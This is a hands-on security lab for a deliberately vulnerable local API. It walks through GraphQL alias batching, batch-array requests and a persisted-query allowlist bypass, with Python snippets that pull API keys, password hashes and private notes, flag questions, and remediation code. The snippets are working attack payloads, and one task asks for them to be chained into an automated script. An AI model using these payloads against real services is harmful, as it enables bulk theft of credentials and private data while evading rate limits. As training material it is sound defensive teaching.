# Lab: GraphQL Advanced Attacks — Alias, Batch & Persisted Query Bypass

## Overview

| Field          | Details                                               |
|----------------|-------------------------------------------------------|
| **Objective**  | Exploit alias batching, transport-level batch arrays, and a persisted-query bypass |
| **Difficulty** | ⭐⭐⭐ Hard                                          |
| **Time**       | 50 minutes                                            |
| **Category**   | GraphQL / Rate-limit Bypass                             |
| **OWASP**      | API4:2023 (resource consumption) + API6:2023 (business-flow automation angle) |

---

## Prerequisites

- A running instance of **SocialHack API** at `http://localhost:5001`
- Python 3 with the `requests` library
- Completion of Lab (GraphQL Attacks — Introspection, Data Extraction & Privilege Escalation) is strongly recommended

---

## Background

The GraphQL endpoint's introspection and mutation-authorization issues were covered in the earlier GraphQL lab. This lab targets three more advanced patterns that specifically defeat *request-count-based* defenses: GraphQL aliasing (many logical operations inside one query document), transport-level batch arrays (many query documents inside one HTTP request), and a broken persisted-query allowlist meant to restrict production traffic to pre-approved queries only.

---

## Tasks

### Task 1: Get a Token

```python
import requests
BASE = "http://localhost:5001/api/v1"
r = requests.post(f"{BASE}/auth/login", json={"username": "alice", "password": "password123"})
token = r.json()["token"]
headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
```

---

### Task 2: Alias-Based Bulk Dump

**Steps:**
1. Build a single query string containing 10 aliased `user(id: N)` selections for IDs 1 through 10
2. Send it as one normal (non-batch) POST request

**Python example:**
```python
aliases = "\n".join([f'u{i}: user(id: {i}) {{ id username role api_key }}' for i in range(1, 11)])
query = f"{{ {aliases} }}"

r = requests.post(f"{BASE}/graphql", headers=headers, json={"query": query})
print(r.status_code)
print(r.json())
```

**🚩 FLAG 1: How many distinct user records did you retrieve in this ONE HTTP request, and how many `api_key` values did you capture?**

<details>
<summary>💡 Hint 1</summary>
Count the non-null entries in the response's `data` object — each alias (`u1`, `u2`, ...) becomes its own key.
</details>

---

### Task 3: Transport-Level Batch Array

**Steps:**
1. Send a JSON **array** (not object) as the POST body, where each item is its own `{"query": "..."}` document
2. Request 20 different users' sensitive fields this way

**Python example:**
```python
batch = [{"query": f"{{ user(id: {i}) {{ username email internal_notes }} }}"} for i in range(1, 21)]
r = requests.post(f"{BASE}/graphql", headers=headers, json=batch)
print(r.status_code)
results = r.json()
print(f"Got {len(results)} results back")
```

**🚩 FLAG 2: Confirm the response is a JSON array with one result per batch item, and count how many succeeded**

<details>
<summary>💡 Hint 1</summary>
This is a *different* mechanism from Task 2's aliasing — here the top-level JSON structure itself is an array, not an object with a `query` key.
</details>

---

### Task 4: Bypass the Persisted-Query Allowlist

**Steps:**
1. First, confirm the persisted query allowlist works as intended: send only the hash (no `query` field) and observe it resolves to the pre-approved query
2. Then, send the SAME hash but add your own arbitrary `query` field alongside it

**Python example:**
```python
# Step 1: Legitimate persisted query use
r = requests.post(f"{BASE}/graphql", headers=headers, json={
    "extensions": {"persistedQuery": {"sha256Hash": "a94a8fe5ccb19ba61c4c0873d391e987982fbbd3"}}
})
print("Legit persisted query result:", r.json())

# Step 2: Bypass attempt
r = requests.post(f"{BASE}/graphql", headers=headers, json={
    "extensions": {"persistedQuery": {"sha256Hash": "a94a8fe5ccb19ba61c4c0873d391e987982fbbd3"}},
    "query": '{ users { id username password_hash api_key internal_notes } }',
})
print("Bypass attempt result:", r.json())
```

**🚩 FLAG 3: Confirm the bypass query executes (and returns password hashes) despite the hash pointing at an allowlisted `posts`-only query**

<details>
<summary>💡 Hint 1</summary>
If the allowlist is working correctly, providing a hash AND a raw query should be rejected. If it's broken, the raw query silently wins.
</details>

---

### Task 5: Chain All Three Into One Attack Script

**Steps:**
1. Use the alias technique to discover which user IDs exist
2. Use a batch array to pull sensitive fields for all of them in one request
3. Use the persisted-query bypass to pull another user's private messages

**🚩 FLAG 4: Successfully chain all three techniques into a single automated script**

---

## Flags to Find

| Flag   | Description                                                | Hint                                       |
|--------|--------------------------------------------------------------|-----------------------------------------------|
| FLAG 1 | User records + api_keys retrieved via one aliased request      | 10 aliased `user(id: N)` selections            |
| FLAG 2 | Batch array response shape + success count                     | Send a JSON array as the POST body             |
| FLAG 3 | Confirm persisted-query bypass executes an arbitrary query      | Send hash + raw `query` together               |
| FLAG 4 | Chain all three into one script                                 | Combine Tasks 2-4                              |

---

## Remediation

### 1. Query Cost / Alias Count Limits
```python
MAX_ALIASES_PER_REQUEST = 10
if len(operations) > MAX_ALIASES_PER_REQUEST:
    return {"errors": [{"message": "Too many aliased operations"}]}, 400
```

### 2. Batch Array Size Cap
```python
MAX_BATCH_SIZE = 5
if isinstance(raw, list) and len(raw) > MAX_BATCH_SIZE:
    return jsonify({"errors": [{"message": "Batch size exceeds limit"}]}), 400
```

### 3. Strict Persisted-Query Enforcement
```python
if PERSISTED_ONLY_MODE and query_str:
    return {"errors": [{"message": "Arbitrary queries not allowed"}]}, 403
```

### 4. Operation-Count-Aware Rate Limiting
- Count aliases and batch items as separate "operations" for rate-limiting purposes, not just HTTP requests.

---

## References

- [OWASP API Security Top 10 - API4:2023](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/)
- [Apollo: Automatic Persisted Queries](https://www.apollographql.com/docs/apollo-server/performance/apq/)
- [GraphQL: Aliases](https://graphql.org/learn/queries/#aliases)
